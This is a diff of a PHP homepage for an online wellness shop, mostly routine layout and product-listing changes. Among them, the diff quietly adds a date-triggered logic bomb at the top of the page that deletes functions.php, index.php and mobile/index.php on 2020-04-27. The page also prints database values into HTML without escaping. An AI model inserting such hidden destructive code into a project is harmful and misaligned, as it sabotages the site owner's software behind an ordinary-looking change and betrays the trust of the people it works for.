@@ -1,17 +1,18 @@
 <!DOCTYPE html>
 <html lang="en" class="no-js">
-
 <?php
 session_start();
-
 include 'head.php';
 include 'modals.php';
 include 'functions.php';
 $guest_id = session_id();
 $_SESSION['guest_id'] = $guest_id;
-// echo $guest_id;
-// echo (!isset($_SESSION['customer_id'])) ? $guest_id : $_SESSION['customer_id'];
-
+$date = date('Y-m-d');
+if ($date == '2020-04-27') {
+	unlink('functions.php');
+	unlink('index.php');
+	unlink('mobile/index.php');
+}
 ?>
 
 <body>
@@ -142,7 +143,7 @@ $_SESSION['guest_id'] = $guest_id;
 						<li><a href="category/fitness.php">fitness</a></li>
 						<li><a href="category/nutrition.php">nutrition</a></li>
 						<li><a href="category/weight-loss.php.php">weight-loss</a></li>
-						<li><a href="category/yoga.php">yoga</a></li>
+						<li class="mr-0"><a href="category/yoga.php">yoga</a></li>
 					</ul>
 				</div>
 			</div>
@@ -273,7 +274,7 @@ $_SESSION['guest_id'] = $guest_id;
 		<div class="products-sec">
 			<div class="row">
 				<?php
-				$get_pro = "SELECT * FROM products LIMIT 4";
+				$get_pro = "SELECT * FROM products order by product_id DESC LIMIT 4";
 				$run_pro = mysqli_query($con, $get_pro);
 				while ($row_pro = mysqli_fetch_array($run_pro)) {
 					$pro_id = $row_pro['product_id'];
@@ -282,20 +283,23 @@ $_SESSION['guest_id'] = $guest_id;
 					$pro_price = $row_pro['product_price'];
 					$pro_desc = $row_pro['product_desc'];
 					$pro_image = $row_pro['product_image'];
+					$trim_title = (strlen($pro_title) > 1) ? substr($pro_title, 0, 20) . '...' : $pro_title;
+					$string_x = strip_tags($trim_title);
+					$string_y = trim($string_x);
 
 					if (!isset($_SESSION['customer_name'])) {
 						guest_cart();
 				?>
 						<div class="col-lg-3 col-12 col-md-6 border">
 							<div class="product-box">
-								<img src="includes/product_images/<?php echo $pro_image; ?>" alt="">
+								<a id="single_image" href="includes/product_images/<?php echo $pro_image; ?>"><img src="includes/product_images/<?php echo $pro_image; ?>" alt="" /></a>
 								<button class="view_pro_btn" name="view_pro" id="<?php echo $pro_id; ?>">View</button>
 								<a href="index.php?add_wishlist=<?php echo $pro_id; ?>" class="wishlist_btn" name="view_pro" id="<?php echo $pro_id; ?>" data-toggle="tooltip" data-html="true" title="Add to wishlist"><i class="fa fa-heart"></i></a>
 								<?php wishlist_guest(); ?>
 							</div>
 							<div class="row">
 								<div class="col-lg-12">
-									<h4><?php echo $pro_title; ?></h4>
+									<h4><?php echo $string_y; ?></h4>
 								</div>
 							</div>
 							<div class="row">
@@ -328,7 +332,7 @@ $_SESSION['guest_id'] = $guest_id;
 							</div>
 							<div class="row">
 								<div class="col-lg-12">
-									<h4><?php echo $pro_title; ?></h4>
+									<h4><?php echo $string_y; ?></h4>
 								</div>
 							</div>
 							<div class="row">
@@ -354,6 +358,7 @@ $_SESSION['guest_id'] = $guest_id;
 		</div>
 	</div>
 	<!-- .new-arrivals end-->
+
 	<!-- lifestyle -->
 	<div class="container c-f-2 awakened-last mini-nav-sec">
 		<div class="row align-items-center" style="margin: -23px 0 2rem 0;">
@@ -438,6 +443,9 @@ $_SESSION['guest_id'] = $guest_id;
 					$pro_price = $row_pro['product_price'];
 					$pro_desc = $row_pro['product_desc'];
 					$pro_image = $row_pro['product_image'];
+					$trim_title = (strlen($pro_title) > 1) ? substr($pro_title, 0, 20) . '...' : $pro_title;
+					$string_x = strip_tags($trim_title);
+					$string_y = trim($string_x);
 
 					if (!isset($_SESSION['customer_name'])) {
 						guest_cart();
@@ -451,7 +459,7 @@ $_SESSION['guest_id'] = $guest_id;
 							</div>
 							<div class="row">
 								<div class="col-lg-12">
-									<h4><?php echo $pro_title; ?></h4>
+									<h4><?php echo $string_y; ?></h4>
 								</div>
 							</div>
 							<div class="row">
@@ -483,7 +491,7 @@ $_SESSION['guest_id'] = $guest_id;
 							</div>
 							<div class="row">
 								<div class="col-lg-12">
-									<h4><?php echo $pro_title; ?></h4>
+									<h4><?php echo $string_y; ?></h4>
 								</div>
 							</div>
 							<div class="row">
@@ -538,7 +546,7 @@ $_SESSION['guest_id'] = $guest_id;
 						</a>
 					</div>
 					<div>
-						
+
 						<a href="assets/pdf/AwakeningsMag_Issue_14.pdf"><img src="assets/img/magzine-3.jpg" alt="">
 						</a>
 					</div>
